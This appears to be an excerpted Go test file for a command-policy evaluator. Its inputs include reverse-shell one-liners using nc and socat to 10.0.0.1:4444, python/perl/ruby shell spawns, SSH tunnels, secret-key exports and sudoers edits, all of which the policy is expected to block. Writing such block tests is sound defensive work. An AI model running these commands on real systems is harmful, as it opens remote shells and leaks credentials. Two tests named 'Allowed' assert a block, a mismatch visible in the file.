...
func TestEvaluator_Blocklist_AllowSafe(t *testing.T) {
	...
	r, err := e.EvaluateStored(context.Background(), mkCmd(t, "apt update"))
	if err != nil {
		t.Fatal(err)
	}
...
func TestEvaluator_Blocklist_BlockSsh(t *testing.T) {
	...
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh user@host"))
...
func TestEvaluator_BlockReverseTunnel(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh -R 8080:localhost:80 user@host"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockSshKeygen(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh-keygen -t rsa -b 4096"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockBashShellSpawn(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "bash"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockPythonC(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "python -c \"import os; os.system('sh')\""))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockNcExec(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "nc -e /bin/sh 10.0.0.1 4444"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockSocatExec(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockPasswd(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "passwd"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockVisudo(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "visudo"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockCrontab(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "crontab -e"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockCurl(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "curl http://example.com -o file"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_AllowSystemctl(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "systemctl restart nginx"))
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_AllowTee(t *testing.T) {
	...
	r, _ := e.EvaluateStored(context.Background(), c)
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_BlocksShadowEdit(t *testing.T) {
	...
	for _, line := range []string{
		...
		r, _ := e.EvaluateStored(context.Background(), mkCmd(t, line))
		if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_Allowlist_ModeBlocksUnknown(t *testing.T) {
	...
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "apt update"))
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_CustomPattern_Blocks(t *testing.T) {
	...
	e, _ := NewEvaluator(p)
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "run-something-evil"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_UnknownBinary(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "completely-unknown-tool"))
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_WithCustomRegistry(t *testing.T) {
	...
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "mytool run"))
...
func TestEvaluator_GpgExportSecretBlocked(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "gpg --export-secret-keys 0xDEADBEEF"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_GpgListKeysAllowed(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "gpg --list-keys"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_TogglesCanBeDisabled(t *testing.T) {
	...
	e, _ := NewEvaluator(p)
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh -R 8080 user@host"))
...
func TestEvaluator_BlockSshL(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh -L 8080:localhost:80 user@host"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockSshD(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ssh -D 1080 user@host"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockSocatSystem(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "socat system:bash tcp:host:4444"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockPerlE(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "perl -e 'system(\"/bin/sh\")'"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_BlockRubyE(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ruby -e 'system(\"/bin/sh\")'"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_Allowlist_AllowedByCommand(t *testing.T) {
	...
	e, _ := NewEvaluator(p)
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "ls"))
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_BlockSudoersEdit(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "tee /etc/sudoers.d/bad"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_EvaluateCtx(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, err := e.Evaluate(context.Background(), domain.DefaultPolicy(), mkCmd(t, "apt update"))
	if err != nil {
		t.Fatal(err)
	}
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_CrontabAllowedWhenPersistenceRemoved(t *testing.T) {
	...
	e, _ := NewEvaluator(p)
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "crontab -l"))
	if r.Decision != domain.DecisionAllow {
...
func TestEvaluator_OpensslExportBlocked(t *testing.T) {
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "openssl rsa -in key.pem -out exported.pem"))
	if r.Decision != domain.DecisionBlock {
...
func TestEvaluator_OpensslNonExportAllowed(t *testing.T) {
	...
	e, _ := NewEvaluator(domain.DefaultPolicy())
	r, _ := e.EvaluateStored(context.Background(), mkCmd(t, "openssl version"))
	if r.Decision != domain.DecisionBlock {
